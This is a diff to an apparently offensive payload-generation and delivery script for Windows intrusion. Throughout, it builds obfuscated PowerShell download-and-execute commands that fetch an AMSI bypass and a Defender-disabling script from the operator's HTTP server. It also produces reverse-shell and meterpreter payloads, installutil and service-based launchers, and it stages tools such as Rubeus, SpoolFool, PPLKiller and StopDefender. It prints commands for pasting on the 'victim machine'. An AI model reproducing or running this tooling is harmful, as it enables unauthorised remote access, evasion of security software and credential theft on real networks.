@@ -219,7 +219,7 @@ parser.add_argument('-gP', '--gport', required=False, type=int, help="grunt List
 parser.add_argument('--payload', default='meterpreter/reverse_https', help='meterpreter payload used')
 parser.add_argument('--inject', default='', help='target process to inject')
 parser.add_argument('--chome', type=str, help='Covenant home directory')
-parser.add_argument('--mhome', default='../metasploit/', type=str, help='Metasploit Custom Meterpreter Scripts directory.')
+parser.add_argument('--mhome', dest='msf_workdir', default='../metasploit/', type=str, help='Metasploit Custom Meterpreter Scripts directory.')
 parser.add_argument('--ps1', help='path to custom powershell script')
 parser.add_argument('--chain', help='''payload transform expression, separated by "-"
 Ex.
@@ -304,7 +304,7 @@ noDef = TempUtil.getFileName(app['bypass']['defender-1']['filename'])
 _noDef = os.path.basename(noDef)
 
 
-wlmgr = WLManager()
+wlmgr = WLManager(_stageless=args.stageless, tempUtil=TempUtil)
 wlmgr.add('Powershell AMSI Bypass', 'noAmsi', 'iWr -%s %s/%s | `i`Ex' % (ubp, httpUrl, _noAmsi))
 wlmgr.add('Clean Defender Rule', 'cleanDef', 'iWr -%s %s/%s | `I`eX' % (ubp, httpUrl, _noDef))
 
@@ -433,7 +433,7 @@ def ez_fit(filepath, **tvar):
 
 # TODO: separate msf / Covenant / Empire
 pandora('py-1', postCode=('run(buf)' if args.os == 'win' else 'write_linux(buf)'), desc='py-1')
-pandora('ps-1')
+pandora('ps-1', desc='ps-1')
 pandora('ps-1', pscmdType='enc')
 #pandora('ps-2', pscmdType='enc', shellUrl=metdll_url, Tvar=dict(inject_name=args.inject, \
 #        import_reflect=dict(url=TempUtil.getFileUrl('Invoke-ReflectivePEInjection.ps1', encFn), var='ii', \
@@ -447,8 +447,9 @@ pandora('vb-1')
 cs_exe('Rubeus.exe', 'Rubeus')
 cs_exe('../challenges/1/122/SpoolSample.exe', 'SpoolSample')
 cs_exe('SpoolFool.exe', 'SpoolFool (CVE-2022-21999)')
-cs_exe('myPsExec.exe', 'Custom PSEXEC. Usage: [myPsExec.Program]::MainString("appsrv01.prod.corp1.com SensorDataService whoami")')
+cs_exe('myPsExec.exe', '[myPsExec.Program]::MainString("appsrv01 SensorDataService powershell -ep bypass -c `"iwr ...`"")')
 cs_exe('csexec.exe', '[csexec.Program]::MainString("\\\\<target> cmd") [Failed]')
+cs_exe('SQL.exe', '[SQL.SQL]::Main(@("<servername>", "<sql>")) # separator = `n')
 
 c_exe('StopDefender.exe', 'StopDefender')
 #c_exe('./artifact/PrintSpoofer.exe', 'PrintSpoofer.exe')
@@ -463,6 +464,7 @@ simple('../PPLDump.exe', 'PPLDump.exe')
 simple('../SysinternalsSuite/PsExec.exe', 'PsExec.exe')
 simple('linikatz.sh')
 simple('BackStab.exe')
+simple('PPLKiller.exe')
 
 pandora('c-1')
 pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python3'), desc='curl + Python3')
@@ -472,11 +474,11 @@ pandora('c-2', Tvar=dict(cmd=wlmgr.getCmd(desc2='py-1')+'|python'), desc='curl +
 if args.revport:
     data = ez_fit('reverse/rev.ps1', ip=args.ip, port=args.revport)
     pandora('custom-ps', shellUrl=TempUtil.getBytesUrl(data, encFn), pscmdType='raw', \
-            postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', desc='rev-ps-clm')
+            postCode='[System.Text.Encoding]::ASCII.GetString($buf)|IEX;', desc='rev-ps')
 
     if netclr == 'v4.0' and _os == 'windows':
-        command = ';'.join(wlmgr.getCmd(desc2=m) for m in ['noAmsi', 'rev-ps-clm'])
-        pandora('installutil-3', Tvar=dict(psraw=command), useTransform=False, FILENAME='rev.ps1', desc='rev-ps-flm')
+        command = ';'.join(wlmgr.getCmd(desc2=m) for m in ['noAmsi', 'rev-ps'])
+        pandora('installutil-3', Tvar=dict(psraw=command), useTransform=False, FILENAME='rev.ps1', desc='rev-ps-bypass')
 
 
 if netclr == 'v4.0' and _os == 'windows':
@@ -487,11 +489,12 @@ if netclr == 'v4.0' and _os == 'windows':
     _command = ''
     for module in ['noAmsi', 'cleanDef']:
         _command += wlmgr.getCmd(desc2=module) + ';'
-    command = _command + 'iWr -%(ubp)s %(base)s/%(main)s|iEx;' % dict(ubp=ubp, base=httpUrl, main=os.path.basename(pandora('ps-1', record=False)))
-    pandora('installutil-3', Tvar=dict(psraw=command), useTransform=False, FILENAME='go.ps1') # assign output statically
-    #pandora('installutil-3', Tvar=dict(psraw=open('reverse/rev.ps1').read().strip()), useTransform=False, FILENAME='rev.ps1') # assign output statically
+    command = _command + wlmgr.getCmd(desc2='ps-1')
+    pandora('installutil-3', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, FILENAME='go.ps1') # TODO: amsi might need invoke first in stageless mode
+    pandora('installutil-3', Tvar=dict(psraw=command.replace('"', '""')), useTransform=False, pscmdType='enc', FILENAME='go.ps1')
     pandora('service-1', Tvar=dict(psraw=command), useTransform=False, FILENAME='svc.ps1')
     pandora('service-2', useTransform=False, FILENAME='svc_.ps1')
+    pandora('psexec-1', useTransform=False)
 
 for common_psmodule in app['common-pstool']:
     c = ''
@@ -518,16 +521,22 @@ if args.chome:
     pandora('vb-1', shellUrl=shellcode_url_grunt, desc='Grunt')
 
 # metasploit custom meterpreter script
-if args.mhome:
+if args.msf_workdir:
     # put noAmsi, Rubeus into win_getTGT.rc
     # maybe. Load amsibypass, Load Rubeus, EXEC Rubeus?
     # ref: /usr/share/metasploit-framework/lib/rex/post/meterpreter/ui/console/command_dispatcher/powershell.rb
-    # copy iex ... to $mhome/noamsi.rc
+    # copy iex ... to $msf_workdir/noamsi.rc
     if _os == 'windows':
         psT = 'powershell_execute \'%s\''
         for o in ['noAmsi', 'Rubeus']:
-            with open(os.path.join(args.mhome, o.lower() + '.rc'), 'w') as f:
+            with open(os.path.join(args.msf_workdir, o.lower() + '.rc'), 'w') as f:
                 f.write(psT % wlmgr.getCmd(desc2=o))
+        #if args.revport:
+        #    execT = 'execute -H -f powershell -a \'-ep bypass -c "%s"\''
+        #    #execT = '$c = client.sys.process.execute("c:\\windows\\system32\\cmd.exe", \'/c powershell -ep bypass -c "%s"\', nil); $c.close'
+        #    for o in ['rev-ps-bypass']:
+        #        with open(os.path.join(args.msf_workdir, o.lower() + '.rc'), 'w') as f:
+        #            f.write((execT % wlmgr.getCmd(desc2=o)).replace('\\', '\\\\'))
 
 oBanner = '''Put following command to victim machine
 
@@ -537,6 +546,7 @@ C payload transformer
 
 print(oBanner)
 print(wlmgr)
+wlmgr.export_cheatsheet()
 
 try:
     print('Serving HTTP on %(ip)s port %(port)d (http://%(ip)s:%(port)d/) ...' % dict(ip=args.ip, port=args.port))
@@ -556,3 +566,4 @@ except KeyboardInterrupt:
 print('[+] clean up Last')
 if os.path.exists(playground):
     shutil.rmtree(playground)
+wlmgr.remove_cheatsheet()
